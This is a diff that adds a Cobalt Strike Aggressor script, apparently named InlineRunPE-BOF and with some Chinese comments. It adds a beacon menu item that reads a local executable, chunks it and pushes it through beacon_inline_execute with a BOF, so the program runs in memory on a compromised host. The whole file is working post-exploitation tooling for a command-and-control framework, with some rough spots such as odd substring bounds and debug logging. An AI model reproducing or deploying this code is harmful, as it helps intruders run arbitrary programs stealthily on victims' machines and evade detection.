@@ -1,0 +1,78 @@
+
+
+sub readAllFileData {
+    $fileHandle = openf($1);
+    $fileData = readb($fileHandle, -1);
+    closef($fileHandle);  
+    return $fileData;  
+}
+
+popup beacon_top {
+  item "InlineRunPE"{
+    local('$bid');
+    foreach $bid ($1){
+      &InlineRunPEDialog($bid);
+    }
+  }
+}
+
+sub InlineRunPE {
+    local('$bid $data $state $count $pename $parameter')
+    $bid = $3['bid'];
+    $pename = $3['file'];
+    $parameter = 'a '.$3['param'];
+    
+    btask($bid, "[+] InlineRunPE-BOF by 7uck5ec");
+
+    blog($bid,"[+] LoadFile: $pename Param: $parameter");
+
+    # read shellcode
+    if(-exists $pename) {
+        $data = readAllFileData($pename);
+    } else {
+        blog($bid, "[!] The file $pename is not found");
+        return;
+    }
+
+    # 加载bof
+    $handle = openf(script_resource("source.obj"));
+	$bofBytes = readb($handle,-1);
+	closef($handle);
+
+    $totalSize = strlen($data);
+    blog($bid,"[+] Total size: $totalSize");
+
+    $chunkSize = 1024 * 900 ;
+    $numChunks = $totalSize / $chunkSize;
+    $remainder = $totalSize % $chunkSize;
+    $index = 0;
+
+    $state = 0; # 记录状态，1表示发送完成
+
+    for($i = 0; $i < $numChunks; $i++){ 
+        blog($bid, "11111111");
+        $chunk = substr($data, $index, $index + $chunkSize);
+    	$args = bof_pack($bid, "ziiiibz", $pename, $state, $totalSize, $index, $chunkSize, $chunk, 'a') ;
+        $index += $chunkSize;
+        beacon_inline_execute($bid, $bofBytes, "go", $args);
+    }
+    
+    if($remainder > 0){
+        blog($bid, "upload end block size: $remainder !");
+        $state = 1;
+        $chunk = substr($data, $index, $index + $remainder);
+        $args = bof_pack($bid, "ziiiibz", $pename, $state, $totalSize, $index , $remainder, $chunk,'a') ;
+        beacon_inline_execute($bid, $bofBytes, "go", $args);
+        btask($1, "upload finish!");
+    }
+
+}
+
+sub InlineRunPEDialog{
+	$dialog = dialog("内存运行",%(bid => $1), &InlineRunPE);
+	dialog_description($dialog, "InlineRunPE");
+    drow_file($dialog, "file", "要运行的EXE:");
+	drow_text($dialog, "param",  "运行参数:");
+	dbutton_action($dialog, "GO!");
+	dialog_show($dialog);
+}
